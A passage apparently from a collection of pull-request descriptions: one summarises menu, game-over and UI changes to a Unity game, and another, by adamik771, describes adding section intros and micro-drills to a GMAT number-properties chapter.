* Updated `MainMenu`, `PauseMenu`, and `GameOverMenu` to automatically assign and label menu buttons ("Start", "Exit", "Restart", "Quit"), and to robustly locate their UI roots in the scene. [[1]](diffhunk://#diff-27eac2732b2f7db8f9b3c4ee71a646f639868fc53bb3d854e2cad21346cfbd80R3-R47) [[2]](diffhunk://#diff-27eac2732b2f7db8f9b3c4ee71a646f639868fc53bb3d854e2cad21346cfbd80R59-R80) [[3]](diffhunk://#diff-64b9e6b96be7dcf967fa3d851143dab6bf9dfe4d16b6bb251f5f5771c3e21890R27-R38) [[4]](diffhunk://#diff-161dfbb2dd5eefd0df225e978028939baad037595c939b9b47ded33cbead4d94R245-R266) [[5]](diffhunk://#diff-161dfbb2dd5eefd0df225e978028939baad037595c939b9b47ded33cbead4d94R31)
* Improved button navigation by disabling left/right selection (only up/down), and synchronizing selection index with the currently highlighted button. [[1]](diffhunk://#diff-a2d5a6593c7c7bfccf39a4bd9d7970fd9ef3f90e8c55c76e07198c698b15dec4L21-R24) [[2]](diffhunk://#diff-a2d5a6593c7c7bfccf39a4bd9d7970fd9ef3f90e8c55c76e07198c698b15dec4R49-R62)

**Game Over Handling:**

* Standardized game over messages to "You Lost" and "You Won" throughout the codebase for consistency. [[1]](diffhunk://#diff-161dfbb2dd5eefd0df225e978028939baad037595c939b9b47ded33cbead4d94L45-R46) [[2]](diffhunk://#diff-161dfbb2dd5eefd0df225e978028939baad037595c939b9b47ded33cbead4d94L76-R77) [[3]](diffhunk://#diff-59e88dd5dbd4570c49beee4d5aadecaf0e23cdf8f624338a786d78f59179b432L73-R73)
* Added logic in `Alien_Navigation` to trigger the game over screen when the player collides with or is detected by the alien.

**Scene/UI Adjustments:**

* Adjusted UI alignment, anchoring, and margins for improved visual layout in `MainGasmeScene.unity`. [[1]](diffhunk://#diff-2cca84818383ee539cb096466f7851321a20e5f48a15dbdf98d6b697f8cf9cd3L3428-R3462) [[2]](diffhunk://#diff-2cca84818383ee539cb096466f7851321a20e5f48a15dbdf98d6b697f8cf9cd3L3945-R3985) [[3]](diffhunk://#diff-2cca84818383ee539cb096466f7851321a20e5f48a15dbdf98d6b697f8cf9cd3L4036-R4073)
* Disabled certain prefab objects by default and removed unused components to streamline the scene. [[1]](diffhunk://#diff-2cca84818383ee539cb096466f7851321a20e5f48a15dbdf98d6b697f8cf9cd3L4060-R4097) [[2]](diffhunk://#diff-2cca84818383ee539cb096466f7851321a20e5f48a15dbdf98d6b697f8cf9cd3L4561-R4597) [[3]](diffhunk://#diff-2cca84818383ee539cb096466f7851321a20e5f48a15dbdf98d6b697f8cf9cd3L4615-R4653) [[4]](diffhunk://#diff-2cca84818383ee539cb096466f7851321a20e5f48a15dbdf98d6b697f8cf9cd3L5556-R5597)

**Gameplay Tweaks:**

* Changed the flashlight's influence cone angle from 60 to 45 degrees for more precise gameplay.

These changes collectively enhance the game's usability, consistency, and player feedback mechanisms.

author: adamik771
body:
## What changed

Improved `src/content/chapters/number-properties.md` — the chapter the platform describes as "the single highest-leverage Quant topic on the GMAT Focus."

### Problem

The chapter had two structural gaps that every other well-developed chapter (arithmetic, exponents-roots, rates-work) already fills:

1. **No section intro fields** — the chapter reader renders these as a gold highlighted box with a Sparkles icon at the top of each section. All six reading sections were missing them, leaving the UI sparse and the student without a "why this matters" before they read.

2. **No micro-drills** — short, fill-in-the-blank exercises with immediate feedback. arithmetic.md has 5, exponents-roots.md has 3, rates-work.md has 1. number-properties.md had zero, despite being the highest-leverage topic.

### What was added

**6 intro fields** (one per reading section):
- `even-and-odd`: frames the DS trap angle — why "is n even?" is harder than it sounds
- `divisibility-rules`: explains why you need the rules even though you're never asked to recite them
- `primes-and-prime-factorization`: positions prime factorization as a technique that unlocks six other tools, not a standalone topic
- `factors-and-multiples`: leads with the GCF-LCM identity (m × n = GCF × LCM) as the DS-facing fact
- `remainders`: frames the master equation (n = dk + r) as the unlock for every variant
- `integer-properties-of-expressions`: connects units-digit cycles and "must be / could be" as the same meta-skill

**4 micro-drills** (one per key quantitative section):
- even-and-odd: 4 parity questions (must be even / must be odd / could be either)
- divisibility-rules: 4 yes/no divisibility checks — no long division allowed
- primes-and-prime-factorization: factor count, prime listing, smallest-n-for-n²-divisible-by-180
- remainders: two remainder-after-operation problems with both pick-a-number and algebraic solutions shown

### What was not changed

- No section IDs, titles, or types changed
- No question IDs or problem-set config changed
- No structural rearrangement
- Lint passes (pre-existing 1 warning, unrelated to this chapter)

## Why this improves learning

The intro boxes reduce cognitive load at section entry — the student knows before reading what they're about to learn and why it matters. The micro-drills convert "I've read this" into "I can actually do this" before the check questions, which catches confusion earlier and reduces frustration at the problem sets.
